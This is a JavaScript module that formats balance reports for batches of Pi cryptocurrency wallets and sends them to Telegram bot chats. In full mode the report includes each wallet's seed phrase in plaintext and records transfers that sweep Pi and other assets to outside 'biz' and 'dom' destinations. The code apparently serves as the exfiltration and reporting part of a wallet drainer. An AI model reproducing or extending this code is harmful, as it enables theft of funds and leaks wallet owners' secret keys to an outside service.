// lib/telegram.js
const TELEGRAM_API_BASE = 'https://api.telegram.org';

function formatDate(iso) {
  if (!iso) return '—';
  try {
    return new Date(iso).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
  } catch {
    return iso;
  }
}

function renderTransferLine(transfer) {
  if (!transfer) return '   Transfer: not attempted';
  if (!transfer.attempted) return '   Transfer: not attempted';
  if (!transfer.success) return `   Transfer: ❌ ${transfer.error || 'failed'}`;

  const parts = [];
  if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
    parts.push(`Pi: ${transfer.piBusinessAmount} π → biz, ${transfer.piDomesticAmount} π → dom`);
  }
  if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
    const other = transfer.otherAssetsTransferred.map((t) => {
      if (t.status === 'sent') return `${t.asset} ${t.amount} → dom`;
      if (t.status === 'skipped') return `${t.asset} skipped`;
      return `${t.asset} ${t.status}`;
    });
    parts.push(`Other: ${other.join(', ')}`);
  }
  if (transfer.txHash) parts.push(`tx: ${transfer.txHash}`);

  return `   Transfer: ✅ ${parts.join(' | ')}`;
}

function renderResultsText(results, mode = 'full') {
  const isFull = mode === 'full';

  const lines = results.map((r) => {
    const short = `${r.address.slice(0, 6)}...${r.address.slice(-4)}`;
    let resultLines = [];

    if (r.status === 'invalid' || r.status === 'error') {
      resultLines.push(`• \`${short}\` — ⚠️ ${r.status}${r.error ? ` (${r.error})` : ''}`);
    } else {
      const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);

      if (isFull) {
        const otherAssets =
          r.otherAssets && r.otherAssets.length > 0
            ? r.otherAssets.map((a) => `${a.balance} ${a.asset}`).join(', ')
            : 'none';

        resultLines.push(`• \`${short}\``);
        resultLines.push(`   Unlocked: ${r.unlockedBalance} π`);
        resultLines.push(`   Locked: ${r.lockedBalance} π (unlocks ${formatDate(r.nextUnlockDate)})`);
        resultLines.push(`   Total: ${total} π`);
        resultLines.push(`   Other assets: ${otherAssets}`);
      } else {
        resultLines.push(`• \`${short}\``);
        resultLines.push(`   Unlocked: ${r.unlockedBalance} π`);
        resultLines.push(`   Locked: ${r.lockedBalance} π`);
        resultLines.push(`   Next Unlock: ${formatDate(r.nextUnlockDate)}`);
        resultLines.push(`   Total: ${total} π`);
      }
    }

    if (isFull && r.seedPhrase) {
      resultLines.push(`   Seed: \`${r.seedPhrase}\``);
    }

    if (isFull && r.transfer) {
      resultLines.push(renderTransferLine(r.transfer));
    }

    return resultLines.join('\n');
  });

  return ['*Pi Wallet Balance Report*', '', ...lines].join('\n\n');
}

async function sendToTarget(botToken, chatId, text) {
  const url = `${TELEGRAM_API_BASE}/bot${botToken}/sendMessage`;

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    const data = await res.json().catch(() => ({}));

    if (!res.ok || data.ok === false) {
      return { chatId, status: 'failed', error: data.description || `HTTP ${res.status}` };
    }
    return { chatId, status: 'sent', error: null };
  } catch (err) {
    return { chatId, status: 'failed', error: err.message };
  }
}

async function sendResultsToTelegram(results, targets, mode = 'full') {
  if (!targets || targets.length === 0) {
    return { attempted: false, deliveries: [] };
  }

  const fullText = renderResultsText(results, mode);
  const CHUNK_LIMIT = 3500;
  const chunks = [];
  for (let i = 0; i < fullText.length; i += CHUNK_LIMIT) {
    chunks.push(fullText.slice(i, i + CHUNK_LIMIT));
  }

  const deliveries = await Promise.all(
    targets.map(async ({ botToken, chatId }) => {
      for (const chunk of chunks) {
        const result = await sendToTarget(botToken, chatId, chunk);
        if (result.status === 'failed') return result;
      }
      return { chatId, status: 'sent', error: null };
    })
  );

  return { attempted: true, deliveries };
}

module.exports = { sendResultsToTelegram };